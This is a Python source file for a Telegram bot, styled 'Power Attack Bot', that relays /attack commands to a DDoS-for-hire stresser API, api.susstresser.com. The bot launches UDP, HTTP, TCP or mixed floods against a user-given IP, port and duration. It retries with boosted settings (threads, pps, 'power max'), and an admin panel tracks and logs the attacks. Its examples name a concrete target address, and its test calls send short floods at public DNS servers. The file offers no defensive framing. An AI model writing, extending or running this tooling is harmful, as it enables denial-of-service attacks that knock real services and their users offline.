# app.py - With API Debugging & Test Feature
import os
import logging
import asyncio
import threading
import aiohttp
import time
import json
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 2

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@flask_app.route('/test-api')
def test_api():
    """Test API endpoint directly"""
    import aiohttp
    import asyncio
    
    async def test():
        url = "https://api.susstresser.com/panel/api/api.php"
        params = {
            "key": API_KEY,
            "host": "1.1.1.1",
            "port": 80,
            "time": 10,
            "method": "UDP"
        }
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, params=params, timeout=30) as response:
                    text = await response.text()
                    return {
                        "status": response.status,
                        "response": text[:500],
                        "full_response": text
                    }
        except Exception as e:
            return {"error": str(e)}
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(test())
    loop.close()
    return jsonify(result)

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
        self.attack_logs = []
    
    def can_start_attack(self, user_id):
        with self.lock:
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ You already have {user_attacks} active attack(s). Max: {MAX_CONCURRENT}"
            if len(self.active_attacks) >= 20:
                return False, "❌ Too many active attacks globally."
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method):
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def log_attack(self, user_id, target, port, duration, method, status, response):
        self.attack_logs.append({
            'user_id': user_id,
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'status': status,
            'response': response[:500],
            'timestamp': datetime.now()
        })
    
    def cleanup(self):
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 10:
                    to_remove.append(aid)
            for aid in to_remove:
                del self.active_attacks[aid]

attack_manager = AttackManager()

# ===== API CALLER WITH DEBUG =====
async def send_attack(target, port, duration, method):
    """Send attack to API with full debug info"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Try different parameter combinations
    params_list = [
        # Method 1: Standard
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method.upper()
        },
        # Method 2: With extra params
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method.upper(),
            "threads": 1000,
            "pps": 1000000
        },
        # Method 3: Alternative format
        {
            "key": API_KEY,
            "host": target,
            "port": port,
            "time": duration,
            "method": method.upper(),
            "power": "max"
        }
    ]
    
    results = []
    
    for i, params in enumerate(params_list, 1):
        try:
            timeout = aiohttp.ClientTimeout(total=duration + 10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                full_url = url + "?" + "&".join([f"{k}={v}" for k, v in params.items()])
                logger.info(f"Attempt {i}: Sending to {full_url[:100]}...")
                
                start_time = time.time()
                async with session.get(url, params=params) as response:
                    elapsed = time.time() - start_time
                    result = await response.text()
                    
                    results.append({
                        'attempt': i,
                        'params': params,
                        'status_code': response.status,
                        'elapsed': elapsed,
                        'response': result[:300],
                        'full_response': result,
                        'success': response.status == 200
                    })
                    
                    logger.info(f"Attempt {i}: Status {response.status}, Time: {elapsed:.2f}s")
                    logger.info(f"Response: {result[:200]}")
                    
                    # If we get a successful response, return it
                    if response.status == 200 and "error" not in result.lower():
                        return {
                            "success": True,
                            "status_code": response.status,
                            "response": result[:500],
                            "full_response": result,
                            "attempts": results,
                            "params_used": params
                        }
        except Exception as e:
            logger.error(f"Attempt {i} failed: {e}")
            results.append({
                'attempt': i,
                'params': params,
                'error': str(e),
                'success': False
            })
    
    # If all attempts failed, return the last result
    if results:
        last = results[-1]
        return {
            "success": False,
            "error": last.get('error', 'All attempts failed'),
            "status_code": last.get('status_code', 0),
            "response": last.get('response', ''),
            "attempts": results
        }
    
    return {"success": False, "error": "No response from API"}

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        "⚡ *POWER ATTACK BOT*\n\n"
        "🔬 API Debug Mode: ENABLED\n"
        "📡 Test API with /testapi\n"
        "💥 Use /attack IP PORT DURATION\n"
        "Example: `/attack 91.108.17.19 32001 60`\n\n"
        "Or use buttons below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test API connection directly"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can test API.")
        return
    
    status_msg = await update.message.reply_text("🔬 Testing API connection...\n\nAttempting to connect...")
    
    # Test API with a simple request
    url = "https://api.susstresser.com/panel/api/api.php"
    test_params = {
        "key": API_KEY,
        "host": "1.1.1.1",
        "port": 80,
        "time": 10,
        "method": "UDP"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            async with session.get(url, params=test_params, timeout=30) as response:
                elapsed = time.time() - start
                text = await response.text()
                
                result_text = (
                    f"🔬 *API TEST RESULTS*\n\n"
                    f"📡 Status: {response.status}\n"
                    f"⏱️ Response Time: {elapsed:.2f}s\n"
                    f"🔑 API Key: {API_KEY[:10]}...\n"
                    f"📝 Response Length: {len(text)} chars\n\n"
                    f"📄 *Response Preview:*\n"
                    f"```\n{text[:500]}\n```\n\n"
                )
                
                if response.status == 200:
                    result_text += "✅ *API is responding!*"
                else:
                    result_text += f"❌ *API returned error code: {response.status}*"
                
                await status_msg.edit_text(result_text, parse_mode='Markdown')
                
    except asyncio.TimeoutError:
        await status_msg.edit_text("❌ *API TIMEOUT*\n\nAPI took too long to respond!")
    except Exception as e:
        await status_msg.edit_text(f"❌ *ERROR*\n\n{str(e)}")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command with debug"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack command.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT DURATION`\n\n"
            "Example: `/attack 91.108.17.19 32001 60`\n"
            "Duration: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        # Show attack details
        details_msg = await update.message.reply_text(
            f"🚀 *INITIATING ATTACK*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Method: UDP\n"
            f"📡 API: {API_KEY[:10]}...\n\n"
            f"⏳ Contacting API...",
            parse_mode='Markdown'
        )
        
        # Start attack
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
        
        # Send attack with debug
        result = await send_attack(target, port, duration, "udp")
        
        # Log the attack
        attack_manager.log_attack(
            user_id, target, port, duration, "udp",
            "success" if result.get('success') else "failed",
            str(result)
        )
        
        # Build response with debug info
        response_text = (
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Method: UDP\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
            f"📡 *API Response:*\n"
            f"```\n{result.get('response', 'No response')[:300]}\n```\n"
        )
        
        # Add debug info
        if 'attempts' in result:
            response_text += f"\n📊 *Attempts: {len(result['attempts'])}*\n"
            for attempt in result['attempts']:
                status = "✅" if attempt.get('success') else "❌"
                response_text += f"{status} Attempt {attempt.get('attempt')}: Status {attempt.get('status_code', 'N/A')}\n"
        
        # Add full response if available
        if result.get('full_response'):
            response_text += f"\n📄 *Full Response Preview:*\n```\n{result['full_response'][:200]}\n```"
        
        await details_msg.edit_text(response_text, parse_mode='Markdown')
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid input: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test API from button"""
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.edit_message_text("❌ Only admin can test API.")
        return
    
    status_msg = await query.edit_message_text("🔬 Testing API connection...")
    
    url = "https://api.susstresser.com/panel/api/api.php"
    test_params = {
        "key": API_KEY,
        "host": "8.8.8.8",
        "port": 53,
        "time": 10,
        "method": "UDP"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            start = time.time()
            async with session.get(url, params=test_params, timeout=30) as response:
                elapsed = time.time() - start
                text = await response.text()
                
                result_text = (
                    f"🔬 *API TEST RESULTS*\n\n"
                    f"📡 Status: {response.status}\n"
                    f"⏱️ Response Time: {elapsed:.2f}s\n"
                    f"🔑 API Key: {API_KEY[:10]}...{API_KEY[-4:]}\n"
                    f"📝 Response Length: {len(text)} chars\n\n"
                    f"📄 *Response:*\n"
                    f"```\n{text[:300]}\n```\n"
                )
                
                if response.status == 200:
                    result_text += "\n✅ *API is working!*"
                else:
                    result_text += f"\n❌ *API Error: {response.status}*"
                
                await status_msg.edit_text(result_text, parse_mode='Markdown')
                
    except Exception as e:
        await status_msg.edit_text(f"❌ *API ERROR*\n\n{str(e)}", parse_mode='Markdown')

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="method_udp")],
        [InlineKeyboardButton("🔥 HTTP", callback_data="method_http")],
        [InlineKeyboardButton("💣 TCP", callback_data="method_tcp")],
        [InlineKeyboardButton("⚡ MIX", callback_data="method_mix")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "Select method:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send: `IP PORT DURATION`\n"
        "Example: `91.108.17.19 32001 60`\n\n"
        "Duration: 60-300 seconds\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("❌ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can start attacks.")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        method = context.user_data.get('attack_method', 'udp')
        
        if duration < 60 or duration > 300:
            await update.message.reply_text("❌ Duration must be 60-300 seconds!")
            return
        
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        status_msg = await update.message.reply_text(
            f"🚀 Sending {method.upper()} attack to {target}:{port}...\n"
            f"⏱️ Duration: {duration}s"
        )
        
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        result = await send_attack(target, port, duration, method)
        
        response_text = (
            f"✅ *ATTACK COMPLETED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Method: {method.upper()}\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: {'✅ SUCCESS' if result.get('success') else '❌ FAILED'}\n\n"
            f"📡 *API Response:*\n"
            f"```\n{result.get('response', 'No response')[:200]}\n```"
        )
        
        await status_msg.edit_text(response_text, parse_mode='Markdown')
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    active = attack_manager.get_active_attacks(user_id)
    
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}`\n"
            text += f"   🎯 {att['target']}:{att['port']}\n"
            text += f"   ⏱️ {remaining}s left\n\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    is_admin = user_id == OWNER_ID
    
    await query.edit_message_text(
        f"👤 *USER INFO*\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"⭐ Level: {'ADMIN' if is_admin else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 API Key: {API_KEY[:10]}...\n\n"
        f"💡 Use /testapi to test API connection",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    
    await query.edit_message_text(
        f"📊 *BOT STATS*\n\n"
        f"⚡ Active Attacks: {len(active)}\n"
        f"📊 Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 API Status: {'Connected' if API_KEY else 'No Key'}\n"
        f"🔑 API Key: {API_KEY[:10]}...\n\n"
        f"💡 /testapi - Test API connection",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
        [InlineKeyboardButton("📊 VIEW LOGS", callback_data="admin_logs")],
        [InlineKeyboardButton("📡 ACTIVE ATTACKS", callback_data="admin_active")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    logs = attack_manager.attack_logs[-10:]  # Last 10 logs
    
    if not logs:
        text = "📊 *NO ATTACK LOGS*"
    else:
        text = f"📊 *RECENT ATTACK LOGS ({len(logs)})*\n\n"
        for log in reversed(logs):
            status = "✅" if log['status'] == 'success' else "❌"
            text += f"{status} {log['target']}:{log['port']} - {log['duration']}s\n"
            text += f"   Response: {log['response'][:50]}...\n\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*"
    else:
        text = f"📊 *ALL ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` | User: {att['user_id']}\n"
            text += f"   🎯 {att['target']}:{att['port']} - {remaining}s left\n\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🔬 TEST API", callback_data="test_api")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        "⚡ *POWER ATTACK BOT*\n\nSelect option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("testapi", test_api_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(test_api_callback, pattern="^test_api$"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_logs, pattern="^admin_logs$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started polling for updates!")
    loop.run_forever()

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 50)
    print("⚡ POWER ATTACK BOT STARTING...")
    print("=" * 50)
    
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    
    # Run Flask
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)